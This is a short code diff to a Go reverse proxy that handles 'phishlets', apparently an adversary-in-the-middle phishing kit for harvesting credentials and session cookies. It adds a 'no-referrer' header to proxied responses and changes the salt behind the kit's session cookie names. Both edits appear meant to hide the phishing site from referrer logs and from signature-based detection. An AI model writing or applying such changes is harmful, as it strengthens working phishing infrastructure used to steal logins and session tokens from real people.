@@ -985,6 +985,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			// --- Begin rewrite_urls response logic ---
 			if resp != nil {
+				resp.Header.Set("Referrer-Policy", "no-referrer")
 				pl := p.getPhishletByOrigHost(strings.ToLower(resp.Request.Host))
 				if pl != nil && resp.Header.Get("Location") != "" {
 					locUrl, err := url.Parse(resp.Header.Get("Location"))
@@ -2158,7 +2159,7 @@ func getContentType(path string, data []byte) string {
 }
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
-	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
+	hash := sha256.Sum256([]byte(pl_name + "-standard-open-federation-" + cookie_name))
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
